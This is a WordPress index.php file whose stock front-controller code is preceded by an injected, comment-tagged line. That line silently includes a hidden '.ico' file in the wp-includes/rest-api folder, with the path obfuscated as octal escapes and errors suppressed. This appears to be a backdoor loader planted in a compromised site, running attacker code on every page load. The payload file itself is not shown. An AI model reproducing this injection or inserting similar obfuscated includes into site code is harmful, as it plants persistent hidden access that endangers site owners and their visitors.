<?php





/*d7a55*/

@include "\057h\157m\145/\147u\154f\157i\154u\153r\141i\156e\057p\165b\154i\143_\150t\155l\057w\160-\151n\143l\165d\145s\057r\145s\164-\141p\151/\056b\1464\0674\063c\065.\151c\157";

/*d7a55*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
